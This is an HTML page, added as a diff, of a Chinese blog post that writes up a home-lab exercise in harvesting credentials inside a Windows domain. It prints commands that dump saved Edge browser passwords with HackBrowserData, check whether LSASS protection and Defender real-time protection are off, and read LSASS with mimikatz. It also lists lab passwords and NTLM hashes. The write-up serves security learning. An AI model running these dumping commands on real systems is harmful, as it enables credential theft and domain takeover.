@@ -1,0 +1,903 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="chiya-66">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1.概念和原理1.1 前置知识域环境中的设备：dc，员工的电脑，web server，sqlserver，exchangeserver 注： exchangeserver是一种邮件服务器，有一个web 界面，在浏览器中登录 而凭证获取就是通过已经拿到权限的服务器，进一步获取到这个服务器中的深层信息，主要是获取域管理员的一个凭证 1.1 凭证类型   凭证 位置 &#x2F; 形态 说明    明文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验：内网凭证获取">
+<meta property="og:url" content="https://chiya-66.github.io/2026/09/09/%E5%AE%9E%E9%AA%8C%EF%BC%9A%E5%86%85%E7%BD%91%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/index.html">
+<meta property="og:site_name" content="Chiya 的博客">
+<meta property="og:description" content="1.概念和原理1.1 前置知识域环境中的设备：dc，员工的电脑，web server，sqlserver，exchangeserver 注： exchangeserver是一种邮件服务器，有一个web 界面，在浏览器中登录 而凭证获取就是通过已经拿到权限的服务器，进一步获取到这个服务器中的深层信息，主要是获取域管理员的一个凭证 1.1 凭证类型   凭证 位置 &#x2F; 形态 说明    明文">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/image18.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/image-18.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/image-20.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/image-21.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/image-22.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/image-23.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/image-24.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/image-25.png">
+<meta property="article:published_time" content="2026-09-09T05:32:15.000Z">
+<meta property="article:modified_time" content="2026-11-07T10:54:29.374Z">
+<meta property="article:author" content="chiya-66">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://chiya-66.github.io/images/notes/image18.png">
+  
+  
+  
+  <title>实验：内网凭证获取 - Chiya 的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"chiya-66.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Chiya 的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="实验：内网凭证获取"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-09-09 13:32" pubdate>
+          2026年9月9日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          24 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">实验：内网凭证获取</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="1-概念和原理"><a href="#1-概念和原理" class="headerlink" title="1.概念和原理"></a>1.概念和原理</h2><h3 id="1-1-前置知识"><a href="#1-1-前置知识" class="headerlink" title="1.1 前置知识"></a>1.1 前置知识</h3><p>域环境中的设备：dc，员工的电脑，web server，sqlserver，exchangeserver</p>
+<p>注： exchangeserver是一种邮件服务器，有一个web 界面，在浏览器中登录</p>
+<p>而凭证获取就是通过已经拿到权限的服务器，进一步获取到这个服务器中的深层信息，主要是获取域管理员的一个凭证</p>
+<h3 id="1-1-凭证类型"><a href="#1-1-凭证类型" class="headerlink" title="1.1 凭证类型"></a>1.1 凭证类型</h3><table>
+<thead>
+<tr>
+<th>凭证</th>
+<th>位置 &#x2F; 形态</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>明文密码</td>
+<td>内存、配置文件、历史记录</td>
+<td>最高价值，可直接复用</td>
+</tr>
+<tr>
+<td>NTLM Hash</td>
+<td>SAM、NTDS.dit、LSASS</td>
+<td>可用于 Pass-the-Hash</td>
+</tr>
+<tr>
+<td>Kerberos Ticket</td>
+<td>内存、磁盘</td>
+<td>TGT&#x2F;TGS，可用于票据传递</td>
+</tr>
+<tr>
+<td>LM Hash</td>
+<td>SAM</td>
+<td>老系统遗留，可被轻易破解</td>
+</tr>
+<tr>
+<td>SSH Key</td>
+<td>~&#x2F;.ssh&#x2F;</td>
+<td>免密登录凭证</td>
+</tr>
+<tr>
+<td>域缓存凭证 (DCC)</td>
+<td>注册表 HKLM\SECURITY\Cache</td>
+<td>域账号离线缓存，可离线爆破</td>
+</tr>
+</tbody></table>
+<h3 id="1-2-常见攻击链路"><a href="#1-2-常见攻击链路" class="headerlink" title="1.2 常见攻击链路"></a>1.2 常见攻击链路</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">初始立足点 <span class="hljs-punctuation">(</span>Shell<span class="hljs-punctuation">)</span><br>    → 权限提升 <span class="hljs-punctuation">(</span>本地管理员/SYSTEM<span class="hljs-punctuation">)</span><br>        → 凭证转储 <span class="hljs-punctuation">(</span>Mimikatz / secretsdump<span class="hljs-punctuation">)</span><br>            → 横向移动 <span class="hljs-punctuation">(</span>Pass-the-Hash / Pass-the-Ticket<span class="hljs-punctuation">)</span><br>                → 域控提权 <span class="hljs-punctuation">(</span>DCSync / Golden Ticket<span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-实验过程"><a href="#2-实验过程" class="headerlink" title="2.实验过程"></a>2.实验过程</h2><h3 id="2-1-实验所需的工具和设备"><a href="#2-1-实验所需的工具和设备" class="headerlink" title="2.1 实验所需的工具和设备"></a>2.1 实验所需的工具和设备</h3><ul>
+<li><p><strong>工具：</strong> HackBrowserData ， mimikatz（注意：在新版本，即2022以后的Windows程序中不让直接使用的，需要关ppl，防火墙啥的，然后需要高权限才能运行）<br>主要用于导出密码</p>
+</li>
+<li><p><strong>设备：</strong> Windows Server 2022 DC ,  web sever , kali</p>
+</li>
+</ul>
+<h3 id="2-2-实验大致过程"><a href="#2-2-实验大致过程" class="headerlink" title="2.2 实验大致过程"></a>2.2 实验大致过程</h3><h4 id="2-2-1-偷取浏览器的凭证"><a href="#2-2-1-偷取浏览器的凭证" class="headerlink" title="2.2.1 偷取浏览器的凭证"></a>2.2.1 偷取浏览器的凭证</h4><h4 id="1-打通隧道并恢复监听"><a href="#1-打通隧道并恢复监听" class="headerlink" title="1. 打通隧道并恢复监听"></a>1. 打通隧道并恢复监听</h4><p>还是，先用蚁剑去连接一下web server，然后在kali的msf去开启监听，步骤和内网隧道搭建时一样<br><img src="/images/notes/image18.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<h4 id="2-将工具HackBrowserData传到我们的web-server上面去"><a href="#2-将工具HackBrowserData传到我们的web-server上面去" class="headerlink" title="2.将工具HackBrowserData传到我们的web server上面去"></a>2.将工具HackBrowserData传到我们的web server上面去</h4><p>通过蚁剑，也可通过kali，上传到windows的&#x2F;temp目录下即可，上传成功后可以检查一下<br><img src="/images/notes/image-18.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<h4 id="3-偷取该计算机当前用户的凭证信息"><a href="#3-偷取该计算机当前用户的凭证信息" class="headerlink" title="3.偷取该计算机当前用户的凭证信息"></a>3.偷取该计算机当前用户的凭证信息</h4><p>这时，我们可以在进程偷取用户的凭证。先查看一下进程列表。</p>
+<p>注意：这里需要被偷取的用户是在线状态（edge是一个打开的情况）</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ps</span><br></code></pre></td></tr></table></figure>
+<p>可以先用ps指令去进程表中去找</p>
+<p><img src="/images/notes/image-20.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<p>找到我选中的这一行即可</p>
+<p>然后进行凭证的偷取</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">steal_token</span>  相关进程的pid<br></code></pre></td></tr></table></figure>
+
+<p>或者直接在web_server上输入以下指令</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">hack</span>-browser-<span class="hljs-meta">data</span>.exe -<span class="hljs-keyword">b</span> edge -c password -f csv -d C:\temp<br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/image-21.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>成功导出用户的密码等信息</p>
+<p>（我在kali尝试的时候一直失败，所以是在服务端进行的，这个是概率性的，觉得自己运气好的可以在kali上试一试）</p>
+<h4 id="2-2-2-偷取本地lsass程序中的凭证（密码）"><a href="#2-2-2-偷取本地lsass程序中的凭证（密码）" class="headerlink" title="2.2.2 偷取本地lsass程序中的凭证（密码）"></a>2.2.2 偷取本地lsass程序中的凭证（密码）</h4><p><strong>注：</strong> lsass程序在Windows中主要用来验证密码，它有一个数据库，里面有密码等一些敏感信息的hash值</p>
+<h4 id="1-还是，先拿到msf的一个会话"><a href="#1-还是，先拿到msf的一个会话" class="headerlink" title="1.还是，先拿到msf的一个会话"></a>1.还是，先拿到msf的一个会话</h4><p>步骤和之前相同，就不多赘述了，注意也要提权到system用户</p>
+<h4 id="2-检测当前环境是否可以用mimikatz"><a href="#2-检测当前环境是否可以用mimikatz" class="headerlink" title="2.检测当前环境是否可以用mimikatz"></a>2.检测当前环境是否可以用mimikatz</h4><p>主要查看ppl , 实时保护，注册表这些是否存在</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">reg query <span class="hljs-string">&quot;HKLM<span class="hljs-char escape_">\S</span>YSTEM<span class="hljs-char escape_">\C</span>urrentControlSet<span class="hljs-char escape_">\C</span>ontrol<span class="hljs-char escape_">\L</span>sa&quot;</span> <span class="hljs-symbol">/v</span> RunAsPPL<br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/image-22.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>如果显示这个，则说明ppl没有安装</p>
+<p>然后检查实时保护</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dart">powershell -c <span class="hljs-string">&quot;Get-MpComputerStatus | Select IsTamperProtected, RealTimeProtectionEnabled&quot;</span><br><span class="hljs-title class_">IsTamperProtected</span> <span class="hljs-title class_">RealTimeProtectionEnabled</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/image-23.png" srcset="/img/loading.gif" lazyload><br>确认实时保护已经关闭</p>
+<h4 id="3-上传mimikatz"><a href="#3-上传mimikatz" class="headerlink" title="3.上传mimikatz"></a>3.上传mimikatz</h4><p>同样，通过蚁剑或者kali的upload指令进行上传，然后开启<br><img src="/images/notes/image-24.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>也可以不进入交互界面直接操作</p>
+<h4 id="4-执行提权和密码读取的操作"><a href="#4-执行提权和密码读取的操作" class="headerlink" title="4.执行提权和密码读取的操作"></a>4.执行提权和密码读取的操作</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\Temp\mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> &gt; C:\Temp\mimi_out.txt <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/image-25.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>成功获取到密码的hash值</p>
+<p>ps:由于提权一直不成功，所以该实验我直接在靶机上进行的操作</p>
+<h2 id="3-实验总结"><a href="#3-实验总结" class="headerlink" title="3.实验总结"></a>3.实验总结</h2><h3 id="模块二完整攻击链（无明文密码，从零拿凭据）"><a href="#模块二完整攻击链（无明文密码，从零拿凭据）" class="headerlink" title="模块二完整攻击链（无明文密码，从零拿凭据）"></a>模块二完整攻击链（无明文密码，从零拿凭据）</h3><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-title class_">Kali</span> 攻击机（<span class="hljs-number">192.168</span>.<span class="hljs-number">21.137</span>）<br>  │ ① frp 代理（模块一）：<span class="hljs-title class_">SOCKS5</span> <span class="hljs-number">1080</span> → 进入内网，直连 <span class="hljs-title class_">WebServer</span><br>  ▼<br><span class="hljs-title class_">WebServer</span>（跳板机，<span class="hljs-number">192.168</span>.<span class="hljs-number">21.168</span>，模块一已通过 webshell + MSF 拿到 SYSTEM）<br>  │ ② 窃取 <span class="hljs-title class_">Edge</span> 浏览器凭据（<span class="hljs-number">2.1</span>）：<span class="hljs-title class_">HackBrowserData</span> 解 <span class="hljs-title class_">App</span>-<span class="hljs-title class_">Bound</span> v20<br>  │       → svc_web 的 <span class="hljs-title class_">Edge</span> 记住的域管明文  saionjisekai\administrator / <span class="hljs-title class_">Admin123</span>!<br>  │<br>  │ ③ mimikatz 抓 LSASS（<span class="hljs-number">2.3</span>）：sekurlsa::logonpasswords<br>  │       → 域管 NTLM <span class="hljs-title class_">Hash</span> + svc_web <span class="hljs-title class_">Hash</span> + <span class="hljs-title class_">WebServer</span> 机器账户 <span class="hljs-title class_">Hash</span>（不靠明文密码）<br>  ▼<br>凭据汇总:<br>  明文   administrator / <span class="hljs-title class_">Admin123</span>!                          （来自浏览器，<span class="hljs-number">2.1</span>）<br>  <span class="hljs-title class_">Hash</span>   administrator : 520126a03f5d5a8d836f1c4f34ede7ce    （域管！来自 LSASS，<span class="hljs-number">2.3</span>，<span class="hljs-title class_">Pass</span>-<span class="hljs-title class_">The</span>-<span class="hljs-title class_">Hash</span> 拿域控）<br>  <span class="hljs-title class_">Hash</span>   svc_web : e19ccf75ee54e06b06a5907af13cef42          （域用户，来自 LSASS，<span class="hljs-number">2.3</span>）<br>  <span class="hljs-title class_">Hash</span>   WIN-<span class="hljs-title class_">VMCDN5AMRDJ</span>$ : 62520f81e888659eb676b15eefdcdcf6 （<span class="hljs-title class_">WebServer</span> 机器账户）<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>一句话：整条链从「一个域密码都不知道」出发，靠模块一 webshell 拿 WebServer SYSTEM + 浏览器&#x2F;LSASS 两处提取，最终拿到域管明文（浏览器）和域管 Hash（LSASS）。LSASS 这步不依赖明文密码——mimikatz 直接读内存捞出域管 NTLM Hash。</strong></p>
+</blockquote>
+<hr>
+<h3 id="详细攻击链（mimikatz-抓-LSASS）"><a href="#详细攻击链（mimikatz-抓-LSASS）" class="headerlink" title="详细攻击链（mimikatz 抓 LSASS）"></a>详细攻击链（mimikatz 抓 LSASS）</h3><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dart">攻击路径: <span class="hljs-title class_">Kali</span> → <span class="hljs-title class_">WebServer</span>（模块一 webshell + MSF 拿 SYSTEM）<br>                     │<br>                    ① 进入 MSF 会话: getuid → NT AUTHORITY\SYSTEM ✅<br>                     │<br>                    ② 确认防护: <span class="hljs-title class_">RunAsPPL</span> 键不存在(PPL未启用) + <span class="hljs-title class_">Defender</span> 实时保护已关 ✅<br>                     │<br>                    ③ meterpreter upload 上传 mimikatz + shell 运行<br>                     │<br>                    ④ sekurlsa::logonpasswords → 域管 <span class="hljs-title class_">Hash</span> ✅ + svc_web <span class="hljs-title class_">Hash</span> ✅ + 机器账户 <span class="hljs-title class_">Hash</span> ✅<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="category-chain-item">安全笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>实验：内网凭证获取</div>
+      <div>https://chiya-66.github.io/2026/09/09/实验：内网凭证获取/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>chiya-66</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年9月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/09/23/%E5%AE%9E%E9%AA%8C%EF%BC%9A%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="实验：内网横向移动">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">实验：内网横向移动</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/09/09/%E5%AE%9E%E9%AA%8C%EF%BC%9A%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/" title="实验：内网隧道搭建">
+                        <span class="hidden-mobile">实验：内网隧道搭建</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
